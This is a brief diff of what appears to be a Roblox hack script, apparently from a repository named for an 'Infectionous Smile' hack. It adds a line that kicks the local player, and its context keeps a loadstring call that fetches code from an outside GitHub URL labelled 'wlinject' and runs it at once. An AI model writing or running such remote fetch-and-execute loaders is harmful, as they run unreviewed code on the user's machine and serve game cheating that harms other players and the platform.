@@ -1,5 +1,5 @@
 -- Whitelists
-
+game.Players.LocalPlayer:Kick()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TrollCodes/Infectionous-Smile-Hack-Roblox/main/wlinject"))()
 
 -- Moderate
